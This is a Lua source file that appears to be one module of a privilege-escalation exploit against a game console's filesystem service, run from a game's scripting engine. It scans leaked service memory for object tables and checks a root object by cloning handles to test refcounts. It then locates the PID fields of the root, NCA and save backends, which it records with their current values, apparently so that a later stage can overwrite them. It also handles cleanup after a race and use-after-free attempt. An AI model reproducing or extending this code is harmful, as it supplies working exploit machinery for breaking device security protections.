-- s2_scan.lua — Single-Pass Prefiltered `fsp-srv` Root Domain Table & Retained Cache Scan
-- Target: Switch 2 (Ounce) — Seedsow Lullaby (Artemis Lua 5.1 VM)
-- Split from s2_promote.lua to stay under the 32,768-byte http.lua PUT /save upload cap.

local P  = require("s2_prim")
local FS = require("s2_fs")

local math_floor = math.floor
local math_abs   = math.abs
local str_byte   = string.byte
local str_sub    = string.sub
local str_rep    = string.rep
local str_format = string.format

local ZERO_24 = str_rep("\0", 24)
local ZERO_56 = str_rep("\0", 56)

local S = {}

local function scan_native_link_str(chunk_str, source_address, seed, links, seen, control_size)
    local length = #chunk_str
    local first_off = (control_size - (source_address % control_size)) % control_size
    local off = first_off
    while (off + 64) <= length do
        local val = P.u64(chunk_str, off)
        if val > 0x100000000 and val < 549755813888 and (val % control_size) == 0 then
            if math_abs(val - seed) < 0x2000000 then
                local zero_tail = (str_sub(chunk_str, off + 9, off + 64) == ZERO_56)
                local src = source_address + off
                local key = str_format("%x:%x", src, val)
                if not seen[key] then
                    seen[key] = true
                    links[#links + 1] = {source = src, value = val, zeroTail = zero_tail}
                end
            end
        end
        off = off + control_size
    end
end

local function unused_cache_tail(tail_str)
    if #tail_str ~= 0x570 then return false end
    if tail_str == str_rep("\0", 0x570) then return true end
    -- Ensure no 0x30-byte slot in 0x30..0x59F holds a live (valid == 1) cache buffer;
    -- invalidated slots (valid == 0) left by restore_clean_alias() or UAF path bytes are safe
    -- and get zeroed by bootstrap_write(array_addr + 0x30) in s2_promote.lua.
    for slot_off0 = 0, 0x570 - 0x30, 0x30 do
        if P.u64(tail_str, slot_off0 + 8) == 0x4000 and
           str_byte(tail_str, slot_off0 + 0x11) ~= 0 and
           P.u64(tail_str, slot_off0 + 0x28) == 0x4000 then
            return false
        end
    end
    return true
end

function S.attach(M)
    function M.discover_metadata_anchors(rt, fs, config, seed_plan, candidate_handle, capture_buf, log_fn)
        local function log(msg) if log_fn then log_fn(msg) end end
        local seed = seed_plan.target
        local src_len = 0x500000
        local src_end = seed + src_len
        local src_win = {start = seed, ["end"] = src_end}
        local links, seen = {}, {}

        for chunk_idx = 0, (src_len / config.ROOT_CAPTURE_CHUNK) - 1 do
            local chunk_addr = seed + chunk_idx * config.ROOT_CAPTURE_CHUNK
            local cr = M.read_fs_address_bytes(rt, fs, config, seed_plan, candidate_handle,
                chunk_addr, config.ROOT_CAPTURE_CHUNK, capture_buf, src_win)
            if not cr.ok then
                return {ok = false, anchors = {}, error = cr.error}
            end
            scan_native_link_str(cr.str, chunk_addr, seed, links, seen, config.CONTROL_SIZE)
        end
        if #links == 0 then return {ok = true, anchors = {}} end

        local bounds = FS.derive_pool_bounds(links, seed)

        local anchors, anchor_seen = {}, {}
        for _, pool_start in ipairs(bounds.candidates) do
            local anchor_addr = pool_start + 0x3a00000
            local aligned_start = seed_plan.addressBias +
                math_floor((anchor_addr - seed_plan.addressBias) / config.ROOT_CAPTURE_CHUNK) * config.ROOT_CAPTURE_CHUNK
            local anchor_off = anchor_addr - aligned_start
            local anchor_len = anchor_off + 0x1000
            local awin = {start = aligned_start, ["end"] = aligned_start + anchor_len}

            local ra = M.read_fs_address_bytes(rt, fs, config, seed_plan, candidate_handle,
                aligned_start, anchor_len, capture_buf, awin)
            local rb = ra.ok and M.read_fs_address_bytes(rt, fs, config, seed_plan, candidate_handle,
                aligned_start, anchor_len, capture_buf, awin) or {ok = false}
            if ra.ok and rb.ok then
                local slice_a = str_sub(ra.str, anchor_off + 1, anchor_off + 24)
                local slice_b = str_sub(rb.str, anchor_off + 1, anchor_off + 24)
                if slice_a == slice_b and #slice_a == 24 then
                    local next_v   = P.u64(slice_a, 0)
                    local prev_v   = P.u64(slice_a, 8)
                    local extent_v = P.u64(slice_a, 16)
                    local ext = FS.parse_external_link(next_v, prev_v, extent_v, anchor_addr)
                    if ext then
                        local mwin = FS.metadata_window_from_next(ext.next)
                        if mwin and (mwin.anchorOffset + 16) <= mwin.length then
                            local k = str_format("%x:%x", mwin.address, anchor_addr)
                            if not anchor_seen[k] then
                                anchor_seen[k] = true
                                anchors[#anchors + 1] = {
                                    poolStart   = pool_start,
                                    nodeAddress = anchor_addr,
                                    next        = ext.next,
                                    extent      = ext.extent,
                                    window      = mwin
                                }
                                log(str_format("METADATA: valid anchor node=0x%x page=0x%x", anchor_addr, mwin.address))
                                break
                            end
                        end
                    end
                end
            end
        end
        return {ok = true, anchors = anchors}
    end

    function M.inspect_fsp_identity_targets(rt, fs, config, address_plan, candidate_handle, capture_buf, log_fn)
        local function log(msg) if log_fn then log_fn(msg) end end
        local opened = fs.open_domain_session()
        if not opened then return {ok = false} end
        local domain_id = opened.rootObj
        if domain_id == 0 or domain_id > 0x4000 then
            rt.close_handle(opened.handle)
            return {ok = false}
        end

        local anchor        = address_plan.target
        local capture_start = anchor - config.ROOT_CAPTURE_BACK
        local capture_end   = capture_start + config.ROOT_CAPTURE_SIZE
        local start_offset  = capture_start - address_plan.addressBias

        local header0_str = str_sub(address_plan.str, 1, 8)
        local header1_str = str_sub(address_plan.str, 9, 16)
        local owner_tail_expected = P.u64s(address_plan.storageSize) .. P.u64s(0x4000)
        local h0_b1, h0_b2 = str_byte(header0_str, 1, 2)
        local ot_b1, ot_b2 = str_byte(owner_tail_expected, 1, 2)

        local retained_arrays, retained_owners = {}, {}
        local array_seen, owner_seen = {}, {}
        local domain_candidates, dom_seen = {}, {}

        local function check_array(addr, s5a0)
            if #s5a0 == 0x5A0 and
               str_sub(s5a0, 1, 8) == header0_str and
               str_sub(s5a0, 9, 16) == header1_str and
               str_byte(s5a0, 0x11) == 0 and
               str_sub(s5a0, 0x19, 0x30) == ZERO_24 and
               unused_cache_tail(str_sub(s5a0, 0x31, 0x5A0)) then
                if not array_seen[addr] then
                    array_seen[addr] = true
                    retained_arrays[#retained_arrays + 1] = {
                        address = addr,
                        str     = s5a0
                    }
                end
            end
        end

        local function check_owner(addr, s78)
            if #s78 == 0x78 and
               str_sub(s78, 0x21, 0x30) == owner_tail_expected and
               P.u64(s78, 0x50) == 0x5A0 and
               P.u32(s78, 0x58) == 10 and
               P.u64(s78, 0x60) == 14 then
                local arr_ptr = P.u64(s78, 0x48)
                if FS.is_canonical_pointer(arr_ptr) and not owner_seen[addr] then
                    owner_seen[addr] = true
                    retained_owners[#retained_owners + 1] = {
                        address = addr,
                        array   = arr_ptr,
                        str     = s78
                    }
                end
            end
        end

        local prev_tail_str = nil
        local prev_tail_addr = 0

        for chunk_idx = 0, config.ROOT_CAPTURE_CHUNKS - 1 do
            local chunk_off  = start_offset + chunk_idx * config.ROOT_CAPTURE_CHUNK
            local chunk_addr = capture_start + chunk_idx * config.ROOT_CAPTURE_CHUNK
            rt.memset(capture_buf, 0xA5, config.ROOT_CAPTURE_CHUNK)
            local rep = fs.ipc_storage_read(candidate_handle, chunk_off, config.ROOT_CAPTURE_CHUNK, capture_buf)
            if rep.error ~= 0 or not rt.has_byte_different_fast(capture_buf, config.ROOT_CAPTURE_CHUNK, 0xA5) then
                rt.close_handle(opened.handle)
                return {ok = false}
            end
            local chunk_str = rt.rd(capture_buf, config.ROOT_CAPTURE_CHUNK)

            -- Check cross-chunk boundary if needed
            if prev_tail_str then
                local boundary = prev_tail_str .. str_sub(chunk_str, 1, 0x5A0)
                for boff = 0, 0x5A0 - 8, 8 do
                    local bb1, bb2 = str_byte(boundary, boff + 1, boff + 2)
                    if bb1 == h0_b1 and bb2 == h0_b2 and str_sub(boundary, boff + 1, boff + 8) == header0_str then
                        check_array(prev_tail_addr + boff, str_sub(boundary, boff + 1, boff + 0x5A0))
                    end
                    if boff >= (0x5A0 - 0x78) then
                        local ob1, ob2 = str_byte(boundary, boff + 0x21, boff + 0x22)
                        if ob1 == ot_b1 and ob2 == ot_b2 and str_sub(boundary, boff + 0x21, boff + 0x30) == owner_tail_expected then
                            check_owner(prev_tail_addr + boff, str_sub(boundary, boff + 1, boff + 0x78))
                        end
                    end
                    if boff >= (0x5A0 - 0x18) then
                        local w0 = P.u64(boundary, boff)
                        local w1 = P.u64(boundary, boff + 8)
                        if (w1 - w0) == 0x58 then
                            local cand = FS.make_domain_candidate(prev_tail_addr + boff, w0, w1, P.u64(boundary, boff + 0x18))
                            if cand then
                                local k = str_format("%x:%x:%x", cand.address, cand.rootVptr, cand.manager)
                                if not dom_seen[k] then
                                    dom_seen[k] = true
                                    domain_candidates[#domain_candidates + 1] = cand
                                end
                            end
                        end
                    end
                end
            end

            -- Single-pass prefiltered scan over `chunk_str` (zero string allocs on non-matching words)
            local clen = #chunk_str
            for off = 0, clen - 0x20, 8 do
                local addr = chunk_addr + off
                if (off + 0x78) <= clen then
                    local ob1, ob2 = str_byte(chunk_str, off + 0x21, off + 0x22)
                    if ob1 == ot_b1 and ob2 == ot_b2 and str_sub(chunk_str, off + 0x21, off + 0x30) == owner_tail_expected then
                        check_owner(addr, str_sub(chunk_str, off + 1, off + 0x78))
                    end
                end
                local wb1, wb2 = str_byte(chunk_str, off + 1, off + 2)
                if (off + 0x5A0) <= clen and wb1 == h0_b1 and wb2 == h0_b2 and str_sub(chunk_str, off + 1, off + 8) == header0_str then
                    check_array(addr, str_sub(chunk_str, off + 1, off + 0x5A0))
                end
                local w0 = P.u64(chunk_str, off)
                if w0 >= 0x1000028E0 and w0 < 549755813888 and (w0 % 8) == 0 then
                    local w1 = P.u64(chunk_str, off + 8)
                    if (w1 - w0) == 0x58 then
                        local mgr = P.u64(chunk_str, off + 0x18)
                        local cand = FS.make_domain_candidate(addr, w0, w1, mgr)
                        if cand then
                            local k = str_format("%x:%x:%x", cand.address, cand.rootVptr, cand.manager)
                            if not dom_seen[k] then
                                dom_seen[k] = true
                                domain_candidates[#domain_candidates + 1] = cand
                            end
                        end
                    end
                end
            end

            prev_tail_str  = str_sub(chunk_str, clen - 0x5A0 + 1, clen)
            prev_tail_addr = chunk_addr + clen - 0x5A0
        end

        -- Pair retainedCache owner & array
        local retained_pairs = {}
        for _, ow in ipairs(retained_owners) do
            for _, ar in ipairs(retained_arrays) do
                if ow.array == ar.address then
                    retained_pairs[#retained_pairs + 1] = {
                        array        = ar.address,
                        owner        = ow.address,
                        arrayBytes   = ar.bytes,
                        arrayStr     = ar.str,
                        ownerBytes   = ow.bytes,
                        ownerStr     = ow.str,
                        captureStart = capture_start,
                        captureEnd   = capture_end
                    }
                end
            end
        end
        local retained_cache = (#retained_pairs == 1) and retained_pairs[1] or nil
        log(str_format("ROOT: wrappers=%d arrays=%d owners=%d pairs=%d",
            #domain_candidates, #retained_arrays, #retained_owners, #retained_pairs))

        local groups = FS.group_domain_candidates(domain_candidates)
        local table_matches = {}
        for _, grp in ipairs(groups) do
            if FS.range_contains(capture_start, config.ROOT_CAPTURE_SIZE, grp.manager, 0x20) then
                local mr = M.read_fs_address_bytes(rt, fs, config, address_plan, candidate_handle, grp.manager, 0x20, capture_buf)
                if mr.ok then
                    local m_count = P.u32(mr.str, 0x10)
                    local t_ptr   = P.u64(mr.str, 0x18)
                    if m_count == 0x4000 and FS.is_canonical_pointer(t_ptr) and
                       FS.range_contains(capture_start, config.ROOT_CAPTURE_SIZE, t_ptr, 0x4000) then
                        local entry_addr = t_ptr + (domain_id - 1) * 0x30
                        if FS.range_contains(capture_start, config.ROOT_CAPTURE_SIZE, entry_addr, 0x30) then
                            local er = M.read_fs_address_bytes(rt, fs, config, address_plan, candidate_handle, entry_addr, 0x30, capture_buf)
                            if er.ok then
                                local e_dom = P.u64(er.str, 0x18)
                                local e_obj = P.u64(er.str, 0x20)
                                local dom_cand = nil
                                for _, d in ipairs(grp.domains) do
                                    if d.address == e_dom then dom_cand = d; break end
                                end
                                if dom_cand and FS.is_canonical_pointer(e_obj) then
                                    local wr = M.read_fs_address_bytes(rt, fs, config, address_plan, candidate_handle, dom_cand.address, 0x20, capture_buf)
                                    if wr.ok and
                                       P.u64(wr.str, 0) == (grp.rootVptr + 0x28E0) and
                                       P.u64(wr.str, 8) == (grp.rootVptr + 0x2938) and
                                       P.u64(wr.str, 0x18) == grp.manager then
                                        table_matches[#table_matches + 1] = {
                                            domainId   = domain_id,
                                            entry      = entry_addr,
                                            domain     = dom_cand.address,
                                            object     = e_obj,
                                            manager    = grp.manager,
                                            table      = t_ptr,
                                            rootVptr   = grp.rootVptr,
                                            entryBytes = er.bytes,
                                            entryStr   = er.str
                                        }
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end

        if #table_matches ~= 1 then
            rt.close_handle(opened.handle)
            return {ok = false, rootCandidateRetryable = true}
        end
        local located = table_matches[1]
        local rr = M.read_fs_address_bytes(rt, fs, config, address_plan, candidate_handle, located.object, 0x40, capture_buf)
        if not rr.ok then
            rt.close_handle(opened.handle)
            return {ok = false, rootCandidateRetryable = true}
        end
        local root_vptr = P.u64(rr.str, 0)
        local root_ref  = P.u32(rr.str, 0x38)
        if root_vptr ~= located.rootVptr or root_ref == 0 or root_ref >= 0x1000000 then
            rt.close_handle(opened.handle)
            return {ok = false, rootCandidateRetryable = true}
        end

        -- +3 clone refcount challenge
        local baseline_str = rr.str
        local clones = {}
        for _ = 1, 3 do
            local ch = fs.clone_object(opened.handle, domain_id)
            if ch ~= 0 then clones[#clones + 1] = ch end
        end
        local during_ok = false
        if #clones == 3 then
            local dr = M.read_fs_address_bytes(rt, fs, config, address_plan, candidate_handle, located.object, 0x40, capture_buf)
            if dr.ok then
                local expected_during = P.put_u32(baseline_str, 0x38, root_ref + 3)
                during_ok = (dr.str == expected_during)
            end
        end
        for i = #clones, 1, -1 do rt.close_handle(clones[i]) end
        local after_r = M.read_fs_address_bytes(rt, fs, config, address_plan, candidate_handle, located.object, 0x40, capture_buf)
        if not during_ok or not after_r.ok or after_r.str ~= baseline_str then
            rt.close_handle(opened.handle)
            return {ok = false, rootCandidateRetryable = true}
        end

        local root_pid = P.u64(baseline_str, 0x30)
        if root_pid <= 1 or root_pid >= 0x1000000 then
            rt.close_handle(opened.handle)
            return {ok = false}
        end

        -- Inspect NCA (+0x10, PID at +0x20) and Save (+0x20, PID at +0x28) backends
        local function check_backend(raw_ptr, ctrl_ptr, pid_off)
            if not FS.is_canonical_pointer(raw_ptr) or not FS.is_canonical_pointer(ctrl_ptr) or raw_ptr ~= (ctrl_ptr + 0x18) then
                return nil
            end
            local b1 = M.read_fs_address_bytes(rt, fs, config, address_plan, candidate_handle, raw_ptr, 0x60, capture_buf)
            local b2 = b1.ok and M.read_fs_address_bytes(rt, fs, config, address_plan, candidate_handle, raw_ptr, 0x60, capture_buf) or {ok = false}
            if not b1.ok or not b2.ok or b1.str ~= b2.str then return nil end
            local vptr = P.u64(b1.str, 0)
            local bpid = P.u64(b1.str, pid_off)
            if not FS.is_canonical_pointer(vptr) or (bpid ~= root_pid and bpid ~= 1) then return nil end
            return {address = raw_ptr, pid = bpid, str = b1.str, bytes = b1.bytes}
        end

        local nca_b  = check_backend(P.u64(baseline_str, 0x10), P.u64(baseline_str, 0x18), 0x20)
        local save_b = check_backend(P.u64(baseline_str, 0x20), P.u64(baseline_str, 0x28), 0x28)
        if not nca_b or not save_b or not retained_cache then
            rt.close_handle(opened.handle)
            return {ok = false}
        end

        log(str_format("ROOT: VERIFIED pid=0x%x domainId=%d array=0x%x owner=0x%x",
            root_pid, domain_id, retained_cache.array, retained_cache.owner))
        return {
            ok            = true,
            domainSession = opened,
            verifiedIdentityTargets = {
                domainId      = domain_id,
                retainedCache = retained_cache,
                domainLayout  = {
                    domainId     = located.domainId,
                    entry        = located.entry,
                    domain       = located.domain,
                    object       = located.object,
                    manager      = located.manager,
                    table        = located.table,
                    rootVptr     = located.rootVptr,
                    entryBytes   = located.entryBytes,
                    captureStart = capture_start,
                    captureEnd   = capture_end
                },
                fields = {
                    {name = "root", object = located.object, objectSize = 0x40, pidOffset = 0x30, before = root_pid, beforeStr = baseline_str},
                    {name = "nca",  object = nca_b.address,  objectSize = 0x60, pidOffset = 0x20, before = nca_b.pid, beforeStr = nca_b.str},
                    {name = "save", object = save_b.address, objectSize = 0x60, pidOffset = 0x28, before = save_b.pid,beforeStr = save_b.str},
                }
            }
        }
    end

    function M.retire_and_cleanup_attempt(rt, fs, setup, config, campaign_state, alias_res, promoted_ok, log_fn)
        local function log(msg) if log_fn then log_fn(msg) end end
        local RACE = require("s2_race")
        local handles = setup.handles
        local workers_safe = (campaign_state == nil) or (campaign_state.workerStateSafe == true)
        local retained_active = alias_res and alias_res.retainedEndpointActive == true
        local safe_to_retry = workers_safe and not retained_active

        if not promoted_ok and handles.candidateHandle and handles.candidateHandle ~= 0 then
            if not workers_safe or retained_active then
                safe_to_retry = false
            elseif alias_res and alias_res.candidateCacheNeedsRetirement then
                log("RETIRE: clearing candidate cache valid byte with 16x 0x42")
                local retire_bytes = {}
                for i = 1, 16 do retire_bytes[i] = 0x42 end
                local ret_res = RACE.install_address_header(rt, fs, setup, config, campaign_state, retire_bytes, "cache-retire", log_fn)
                if not ret_res.ok or not campaign_state.workerStateSafe then
                    safe_to_retry = false
                else
                    local vbuf = rt.alloc_page(0x1000)
                    local check_off = alias_res.activeReadOffset or config.ALIAS_OFFSET
                    local exp_hex = alias_res.aliasControlHex
                    if alias_res.activeReadOffset and handles.storageHandle and handles.storageHandle ~= 0 then
                        rt.memset(vbuf, 0x5A, 16)
                        local r0 = fs.ipc_storage_read(handles.storageHandle, check_off, 16, vbuf)
                        exp_hex = (r0.error == 0) and P.hex(rt.rd(vbuf, 16)) or ""
                    end
                    if fs.ipc_storage_invalidate(handles.candidateHandle, 0, config.STORAGE_SIZE or 0x40000000) ~= 0 then
                        safe_to_retry = false
                    else
                        rt.memset(vbuf, 0xA5, 16)
                        local r1 = fs.ipc_storage_read(handles.candidateHandle, check_off, 16, vbuf)
                        local hex1 = (r1.error == 0) and P.hex(rt.rd(vbuf, 16)) or ""
                        if exp_hex == "" or hex1 ~= exp_hex then
                            safe_to_retry = false
                        end
                    end
                end
            end
            if safe_to_retry then
                rt.close_handle(handles.candidateHandle)
                handles.candidateHandle = 0
            end
        end

        if (promoted_ok or safe_to_retry) and handles.savedHandle and handles.savedHandle ~= 0 then
            fs.ipc_file_invalidate(handles.savedHandle, setup.dirtyFilePath, config.DIRTY_FILE_SIZE)
            fs.remove_scratch_tree(handles.savedHandle, setup.SCRATCH_DIR)
            local check_hole = fs.ipc_get_entry_type(handles.savedHandle, setup.SCRATCH_DIR)
            local check_temp = (handles.temporaryHandle and handles.temporaryHandle ~= 0)
                and fs.ipc_get_entry_type(handles.temporaryHandle, setup.SCRATCH_DIR) or check_hole
            if check_hole.transport ~= 0 or (check_hole.result % 0x400000) ~= 0x202 or
               check_temp.transport ~= 0 or (check_temp.result % 0x400000) ~= 0x202 then
                safe_to_retry = false
            end
        end

        if promoted_ok or safe_to_retry then
            for _, h in ipairs(handles.saveClones or {}) do rt.close_handle(h) end
            for _, h in ipairs(handles.rootClones or {}) do rt.close_handle(h) end
            for _, h in ipairs(handles.extraStorages or {}) do
                if h ~= 0 then rt.close_handle(h) end
            end
            if not promoted_ok and handles.domainSession and handles.domainSession.handle then
                rt.close_handle(handles.domainSession.handle)
                handles.domainSession = nil
            end
            rt.close_handle(handles.triggerHandle)
            rt.close_handle(handles.extentTriggerHandle)
            rt.close_handle(handles.savedHandle)
            rt.close_handle(handles.temporaryHandle)
            rt.close_handle(handles.storageHandle)
            rt.close_handle(handles.auxiliaryStorageHandle)
            rt.close_handle(handles.pinHandle)
            rt.close_handle(handles.rootSession)
        end

        return {
            ok          = true,
            safeToRetry = (not promoted_ok) and safe_to_retry and ((campaign_state == nil) or campaign_state.workerStateSafe)
        }
    end
end

return S
